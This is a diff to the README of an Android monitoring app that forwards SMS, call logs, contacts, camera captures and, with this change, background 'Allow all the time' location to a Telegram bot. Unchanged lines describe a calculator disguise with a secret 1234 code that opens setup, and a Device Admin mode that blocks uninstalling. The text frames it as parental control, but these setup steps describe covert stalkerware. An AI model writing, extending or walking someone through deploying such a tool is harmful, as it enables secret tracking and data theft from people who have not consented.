@@ -50,7 +50,7 @@
 - **Android OS**: 8.0 (API 26) or higher
 - **RAM**: 2 GB minimum
 - **Storage**: 50 MB free
-- **Permissions**: SMS, Call Log, Contacts, Camera
+- **Permissions**: SMS, Call Log, Contacts, Camera, Location (foreground + Allow all the time)
 
 ---
 
@@ -72,7 +72,7 @@ Optional repository secrets (`Settings > Secrets and variables > Actions`):
 
 Without secrets the build still succeeds — the bot is configured manually inside the app (recommended).
 
-Custom parental build (no calculator): fill `BOT_TOKEN` + `CHAT_ID` secrets, then run **Actions > Build APK > Run workflow** with `build_type: release` and `parental_ui: true`. The launcher then shows a Parental Control page with only **Grant all permissions**, and the token is prefilled from the build.
+Custom parental build (no calculator): fill `BOT_TOKEN` + `CHAT_ID` secrets, then run **Actions > Build APK > Run workflow** with `build_type: release` and `parental_ui: true`. The launcher then shows a Parental Control page with only **Grant all permissions** (tap until location shows granted, then allow background location), and the token is prefilled from the build.
 
 ### 🤖 Creating a Telegram Bot
 
@@ -89,7 +89,7 @@ Custom parental build (no calculator): fill `BOT_TOKEN` + `CHAT_ID` secrets, the
 5. Type `1234` then press `=` — the **Telegram Bot Setup** page opens.
 6. Enter **Bot Token**, **Chat ID**, and sync interval, then tap **Save settings**.
 7. Tap **Test Connection** and confirm the message arrives in Telegram.
-8. Tap **Grant all permissions** (SMS, Call Log, Contacts, Camera).
+8. Tap **Grant all permissions** (SMS, Call Log, Contacts, Camera, Location), then grant background location via **Grant background location (Allow all the time)**.
 9. Optionally tap **Enable Protection** (Device Admin).
 10. Tap **Enable monitoring** — done.
 
@@ -140,6 +140,7 @@ Date: 19.10.2025 14:28
 | "App not installed" | Uninstall previous version first (signature mismatch) |
 | No messages in Telegram | Check token/Chat ID via Test Connection on the setup page |
 | Monitoring doesn't start | Grant all permissions, disable battery optimization |
+| `/location` says permission missing | Tap **Grant background location (Allow all the time)** in Setup, enable Precise location + GPS |
 | Camera not working | On Android 10+, camera capture needs the app in foreground |
 | Can't uninstall | Settings → Security → Device Admin → deactivate first |
 
